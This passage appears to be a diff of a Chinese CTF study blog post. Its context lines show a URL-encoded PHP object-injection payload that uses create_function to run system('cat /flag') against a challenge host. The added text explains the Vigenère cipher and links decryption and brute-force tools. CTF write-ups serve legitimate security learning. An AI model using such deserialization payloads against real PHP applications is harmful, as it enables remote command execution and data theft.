@@ -188,3 +188,18 @@ O%3A4%3A%22func%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A121%3A%22a%3A2%3A%7Bi%3A0%3B
 http://111.74.9.109:10069/?0=O%3A4%3A%22func%22%3A3%3A%7Bs%3A4%3A%22mod1%22%3BN%3Bs%3A4%3A%22mod2%22%3BN%3Bs%3A3%3A%22key%22%3Bs%3A126%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A24%3A%22%3B%7Dsystem%28%27cat+%2Fflag%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D
 
 图片
+
+
+
+维吉尼亚密码
+维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。
+
+ctf解题中，发现具有flag的形式(大括号什么的)，但又不能通过凯撒或栅栏去恢复的时候，可以尝试维吉尼亚解密。
+
+已知密文和key，可使用该网站工具解密: http://www.atoolbox.net/Tool.php?Id=856
+密文较长，且未知key，可使用该网站工具尝试爆破: https://www.guballa.de/vigenere-solver
+
+2021/8/20
+————————————————
+版权声明：本文为CSDN博主「xuqi7」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/xuqi7/article/details/119850322
